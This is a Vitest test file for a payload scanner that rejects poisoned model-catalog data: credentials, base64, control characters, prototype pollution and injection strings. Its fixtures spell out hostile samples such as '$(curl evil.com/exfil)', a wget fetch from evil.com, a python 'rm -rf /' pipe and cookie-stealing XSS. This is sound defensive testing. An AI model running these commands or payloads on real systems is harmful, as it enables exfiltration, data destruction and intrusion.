import { describe, expect, it } from "vitest";
import { scanPayload, assertCleanPayload } from "../src/security.js";


// ---------------------------------------------------------------------------
// scanPayload — comprehensive threat detection
// ---------------------------------------------------------------------------

describe("scanPayload", () => {
	// -----------------------------------------------------------------------
	// base64
	// -----------------------------------------------------------------------

	describe("base64", () => {
		it("detects base64 in a string value", () => {
			const hit = scanPayload({ key: "YWRtaW46cGFzc3dvcmQxMjNAZXhhbXBsZS5jb20=" });
			expect(hit).toBeDefined();
			expect(hit!.threat).toBe("base64");
			expect(hit!.path).toBe(".key");
		});

		it("detects base64 in an object key", () => {
			const hit = scanPayload({
				"c2VjcmV0X2tleV9leGZpbHRyYXRpb25fYXR0ZW1wdA==": { mode: "chat" },
			});
			expect(hit).toBeDefined();
			expect(hit!.threat).toBe("base64");
		});

		it("detects base64 without padding", () => {
			// Built rather than pasted so the assertion states its own intent:
			// arbitrary bytes, base64-encoded, padding stripped.
			const unpadded = Buffer.from("kosha discovery registry 2026 test vector")
				.toString("base64")
				.replace(/=+$/, "");
			const hit = scanPayload({ val: unpadded });
			expect(hit).toBeDefined();
			expect(hit!.threat).toBe("base64");
		});

		it("allows digit-free identifier-shaped strings in the base64 alphabet", () => {
			// A namespaced model ID from models.dev. 33 chars, mixed case, in the
			// base64 alphabet — and flagging it used to reject the entire
			// 222-provider catalog, taking every keyless fallback down with it.
			expect(scanPayload({ "deepinfra/thinkingmachines/Inkling": { id: "x" } })).toBeUndefined();
			expect(scanPayload({ details: "/api/v1/models/openrouter/free/endpoints" })).toBeUndefined();
		});

		it("detects a credential hidden behind base64 even with no digit signal", () => {
			// Decoded rather than guessed at from character distribution, so the
			// narrowing above does not create a hole to smuggle a key through.
			const fakeKey = "sk-abcdefghijklmnopqrstuvwxyzABCDEF";
			const encoded = Buffer.from(`token ${fakeKey}`).toString("base64");
			const hit = scanPayload({ note: encoded });
			expect(hit).toBeDefined();
			expect(hit!.threat).toBe("base64");
		});

		it("detects a script payload hidden behind base64", () => {
			const encoded = Buffer.from("<script>fetch('http://evil')</script>").toString("base64");
			expect(scanPayload({ note: encoded })?.threat).toBe("base64");
		});

		it("ignores short strings that match base64 alphabet", () => {
			expect(scanPayload({ id: "gpt4o", provider: "openai" })).toBeUndefined();
		});
	});

	describe("terminal and rendering injection", () => {
		it("rejects ANSI escape sequences in a model name", () => {
			// kosha prints model names straight to a terminal, so an ESC here is
			// enough to clear the screen or rewrite earlier output.
			const hit = scanPayload({ name: "gpt-\u001b[2J\u001b[Hevil" });
			expect(hit?.threat).toBe("control_chars");
		});

		it("rejects an OSC window-title sequence in a model ID", () => {
			expect(scanPayload({ id: "model\u001b]0;pwned\u0007" })?.threat).toBe("control_chars");
		});

		it("rejects a control character used as an object key", () => {
			expect(scanPayload({ "bad\u001bkey": 1 })?.threat).toBe("control_chars");
		});

		it("rejects bidi overrides that make text render unlike its bytes", () => {
			expect(scanPayload({ id: "claude-\u202eopus" })?.threat).toBe("bidi_override");
		});

		it("rejects zero-width characters in an ID", () => {
			expect(scanPayload({ id: "claude\u200b-opus" })?.threat).toBe("bidi_override");
		});

		it("still allows tab, newline, and carriage return in prose", () => {
			expect(scanPayload({ description: "line one\nline two\ttabbed\r" })).toBeUndefined();
		});
	});

	describe("nesting", () => {
		it("reports excessive nesting instead of overflowing the stack", () => {
			const root: Record<string, unknown> = {};
			let cursor = root;
			for (let i = 0; i < 500; i++) {
				const next: Record<string, unknown> = {};
				cursor.n = next;
				cursor = next;
			}
			expect(scanPayload(root)?.threat).toBe("excessive_nesting");
		});

		it("accepts the nesting depth a real catalog uses", () => {
			const realistic = { provider: { models: { "m-1": { cost: { batch: { input: 1 } } } } } };
			expect(scanPayload(realistic)).toBeUndefined();
		});
	});

	// -----------------------------------------------------------------------
	// credential_leak
	// -----------------------------------------------------------------------

	describe("credential_leak", () => {
		it("detects OpenAI API key (sk-)", () => {
			const hit = scanPayload({ token: "sk-abc123def456ghi789jkl012mno345" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects OpenAI project key (sk-proj-)", () => {
			const hit = scanPayload({ token: "sk-proj-abc123def456ghi789jkl012mno345" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects AWS access key ID (AKIA)", () => {
			const hit = scanPayload({ key: "AKIAIOSFODNN7EXAMPLE" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects GitHub personal access token (ghp_)", () => {
			const hit = scanPayload({ key: "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects GitHub OAuth token (gho_)", () => {
			const hit = scanPayload({ key: "gho_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklm" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects Slack bot token (xoxb-)", () => {
			const hit = scanPayload({ token: "xoxb-123456789012-123456789012-AbCdEf" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects Slack user token (xoxp-)", () => {
			const hit = scanPayload({ token: "xoxp-123456789012-123456789012-AbCdEf" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects Google API key (AIza)", () => {
			const hit = scanPayload({ key: "AIzaSyA1234567890abcdefghijklmnopqrstuvw" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects GitLab personal access token (glpat-)", () => {
			const hit = scanPayload({ token: "glpat-ABCDEFGHIJKLMNOPQRSTu" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects npm token", () => {
			const hit = scanPayload({ token: "npm_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects Hugging Face token (hf_)", () => {
			const hit = scanPayload({ token: "hf_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg" });
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects Bearer token in data value", () => {
			const hit = scanPayload({
				auth: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0",
			});
			expect(hit?.threat).toBe("credential_leak");
		});

		it("detects credential in a key", () => {
			const hit = scanPayload({ "sk-proj-abc123def456ghi789jkl012mno345": "value" });
			expect(hit?.threat).toBe("credential_leak");
		});
	});

	// -----------------------------------------------------------------------
	// script_injection
	// -----------------------------------------------------------------------

	describe("script_injection", () => {
		it("detects <script> tag", () => {
			const hit = scanPayload({ name: '<script>alert("xss")</script>' });
			expect(hit?.threat).toBe("script_injection");
		});

		it("detects <script> case-insensitive", () => {
			const hit = scanPayload({ name: "<SCRIPT SRC=evil.js>" });
			expect(hit?.threat).toBe("script_injection");
		});

		it("detects event handler injection", () => {
			const hit = scanPayload({ desc: 'model" onload="alert(1)' });
			expect(hit?.threat).toBe("script_injection");
		});

		it("detects onerror handler", () => {
			const hit = scanPayload({ img: 'x" onerror="fetch(\'evil.com\')"' });
			expect(hit?.threat).toBe("script_injection");
		});

		it("detects javascript: URI", () => {
			const hit = scanPayload({ url: "javascript:alert(document.cookie)" });
			expect(hit?.threat).toBe("script_injection");
		});

		it("detects javascript: URI case-insensitive with spaces", () => {
			const hit = scanPayload({ url: "JavaScript : void(0)" });
			expect(hit?.threat).toBe("script_injection");
		});
	});

	// -----------------------------------------------------------------------
	// shell_injection
	// -----------------------------------------------------------------------

	describe("shell_injection", () => {
		it("detects $() command substitution", () => {
			const hit = scanPayload({ name: "$(curl evil.com/exfil)" });
			expect(hit?.threat).toBe("shell_injection");
		});

		it("detects backtick command execution", () => {
			const hit = scanPayload({ val: "`curl evil.com`" });
			expect(hit?.threat).toBe("shell_injection");
		});

		it("detects pipe to curl", () => {
			const hit = scanPayload({ cmd: "data | curl evil.com" });
			expect(hit?.threat).toBe("shell_injection");
		});

		it("detects semicolon chain to bash", () => {
			const hit = scanPayload({ cmd: "model; bash -c 'evil'" });
			expect(hit?.threat).toBe("shell_injection");
		});

		it("detects pipe to wget", () => {
			const hit = scanPayload({ cmd: "| wget http://evil.com/payload" });
			expect(hit?.threat).toBe("shell_injection");
		});

		it("detects pipe to python", () => {
			const hit = scanPayload({ cmd: "data | python -c 'import os; os.system(\"rm -rf /\")'" });
			expect(hit?.threat).toBe("shell_injection");
		});
	});

	// -----------------------------------------------------------------------
	// data_uri
	// -----------------------------------------------------------------------

	describe("data_uri", () => {
		it("detects data:text/html URI", () => {
			const hit = scanPayload({ url: "data:text/html,<h1>evil</h1>" });
			expect(hit?.threat).toBe("data_uri");
		});

		it("detects data:application/javascript URI", () => {
			const hit = scanPayload({ url: "data:application/javascript,alert(1)" });
			expect(hit?.threat).toBe("data_uri");
		});
	});

	// -----------------------------------------------------------------------
	// null_byte
	// -----------------------------------------------------------------------

	describe("null_byte", () => {
		it("detects literal null byte", () => {
			const hit = scanPayload({ val: "hello\x00world" });
			expect(hit?.threat).toBe("null_byte");
		});

		it("detects \\x00 escape", () => {
			const hit = scanPayload({ val: "hello\\x00world" });
			expect(hit?.threat).toBe("null_byte");
		});

		it("detects %00 URL encoding", () => {
			const hit = scanPayload({ val: "file.txt%00.jpg" });
			expect(hit?.threat).toBe("null_byte");
		});

		it("detects \\u0000 unicode escape", () => {
			const hit = scanPayload({ val: "hello\\u0000world" });
			expect(hit?.threat).toBe("null_byte");
		});

		it("detects null byte in an object key", () => {
			const data = JSON.parse('{"foo\\u0000bar": "safe"}');
			const hit = scanPayload(data);
			expect(hit?.threat).toBe("null_byte");
		});
	});

	// -----------------------------------------------------------------------
	// proto_pollution
	// -----------------------------------------------------------------------

	describe("proto_pollution", () => {
		it("detects __proto__ key", () => {
			const data = JSON.parse('{"__proto__": {"admin": true}}');
			const hit = scanPayload(data);
			expect(hit?.threat).toBe("proto_pollution");
		});

		it("detects nested __proto__", () => {
			const data = JSON.parse('{"models": {"__proto__": {"pwned": true}}}');
			const hit = scanPayload(data);
			expect(hit?.threat).toBe("proto_pollution");
			expect(hit!.path).toContain("__proto__");
		});

		it("allows 'constructor' key (common in legitimate JSON)", () => {
			const data = { constructor: "SomeModel", mode: "chat" };
			expect(scanPayload(data)).toBeUndefined();
		});

		it("allows 'prototype' key (common in legitimate JSON)", () => {
			const data = { prototype: "v1", version: 2 };
			expect(scanPayload(data)).toBeUndefined();
		});
	});

	// -----------------------------------------------------------------------
	// hex_payload
	// -----------------------------------------------------------------------

	describe("hex_payload", () => {
		it("detects 0x-prefixed hex blob (64+ chars)", () => {
			const hex = "0x" + "1234567890abcdef".repeat(4);
			const hit = scanPayload({ val: hex });
			expect(hit?.threat).toBe("hex_payload");
		});

		it("detects 0x-prefixed long hex blob", () => {
			const hex = "0x" + "00112233".repeat(8);
			const hit = scanPayload({ val: hex });
			expect(hit?.threat).toBe("hex_payload");
		});

		it("ignores short hex strings", () => {
			expect(scanPayload({ color: "ff5733" })).toBeUndefined();
		});
	});

	// -----------------------------------------------------------------------
	// oversized_string
	// -----------------------------------------------------------------------

	describe("oversized_string", () => {
		it("detects strings longer than 2048 characters", () => {
			const hit = scanPayload({ val: "hello world! ".repeat(158) });
			expect(hit?.threat).toBe("oversized_string");
		});

		it("allows strings up to 2048 characters", () => {
			const safe = "model description with spaces & special chars.".repeat(43);
			expect(scanPayload({ val: safe.slice(0, 2048) })).toBeUndefined();
		});
	});

	// -----------------------------------------------------------------------
	// Deep nesting and mixed scenarios
	// -----------------------------------------------------------------------

	describe("deep nesting", () => {
		it("detects threat buried in deeply nested structure", () => {
			const data = {
				a: { b: { c: [{ d: { secret: "sk-abc123def456ghi789jkl012mno345" } }] } },
			};
			const hit = scanPayload(data);
			expect(hit?.threat).toBe("credential_leak");
			expect(hit!.path).toBe(".a.b.c[0].d.secret");
		});

		it("detects base64 in array inside nested object", () => {
			const data = {
				models: {
					list: ["safe", "YWRtaW46cGFzc3dvcmQxMjNAZXhhbXBsZS5jb20="],
				},
			};
			const hit = scanPayload(data);
			expect(hit?.threat).toBe("base64");
			expect(hit!.path).toBe(".models.list[1]");
		});
	});

	// -----------------------------------------------------------------------
	// Clean data — must pass through
	// -----------------------------------------------------------------------

	describe("clean data passthrough", () => {
		it("returns undefined for typical model metadata", () => {
			const clean = {
				"claude-sonnet-4-20250514": {
					max_tokens: 16384,
					max_input_tokens: 200000,
					max_output_tokens: 16384,
					input_cost_per_token: 0.000003,
					output_cost_per_token: 0.000015,
					litellm_provider: "anthropic",
					mode: "chat",
					supports_function_calling: true,
					supports_vision: true,
					supports_prompt_caching: true,
				},
				"openai/gpt-4o": {
					max_tokens: 16384,
					input_cost_per_token: 0.0000025,
					litellm_provider: "openai",
					mode: "chat",
				},
			};
			expect(scanPayload(clean)).toBeUndefined();
		});

		it("returns undefined for provider API model list response", () => {
			const clean = {
				object: "list",
				data: [
					{
						id: "gpt-4o-2024-08-06",
						object: "model",
						created: 1722814719,
						owned_by: "system",
					},
					{
						id: "text-embedding-3-small",
						object: "model",
						created: 1705948997,
						owned_by: "system",
					},
				],
			};
			expect(scanPayload(clean)).toBeUndefined();
		});

		it("handles empty objects and arrays", () => {
			expect(scanPayload({})).toBeUndefined();
			expect(scanPayload([])).toBeUndefined();
			expect(scanPayload({ nested: {}, list: [] })).toBeUndefined();
		});

		it("handles numbers, booleans, and null", () => {
			expect(scanPayload({ count: 42, active: true, nothing: null })).toBeUndefined();
		});

		it("allows legitimate URLs in model data", () => {
			expect(scanPayload({ endpoint: "https://api.openai.com/v1/models" })).toBeUndefined();
		});

		it("allows model names with slashes and dots", () => {
			expect(scanPayload({
				id: "meta-llama/Llama-3.1-70B-Instruct",
				provider: "deepinfra",
			})).toBeUndefined();
		});
	});
});

// ---------------------------------------------------------------------------
// assertCleanPayload
// ---------------------------------------------------------------------------

describe("assertCleanPayload", () => {
	it("does not throw for clean data", () => {
		expect(() => assertCleanPayload({ mode: "chat", cost: 0.01 }, "test")).not.toThrow();
	});

	it("throws with source name and threat for poisoned data", () => {
		const poisoned = { evil: "YWRtaW46cGFzc3dvcmQxMjNAZXhhbXBsZS5jb20=" };
		expect(() => assertCleanPayload(poisoned, "TestProvider API")).toThrow(
			/Rejected TestProvider API data.*base64 detected.*\.evil/,
		);
	});

	it("throws for credential leak", () => {
		expect(() =>
			assertCleanPayload({ token: "sk-abc123def456ghi789jkl012mno345" }, "SomeAPI"),
		).toThrow(/credential_leak/);
	});

	it("throws for script injection", () => {
		expect(() =>
			assertCleanPayload({ name: "<script>alert(1)</script>" }, "SomeAPI"),
		).toThrow(/script_injection/);
	});

	it("throws for shell injection", () => {
		expect(() =>
			assertCleanPayload({ name: "$(curl evil.com)" }, "SomeAPI"),
		).toThrow(/shell_injection/);
	});
});
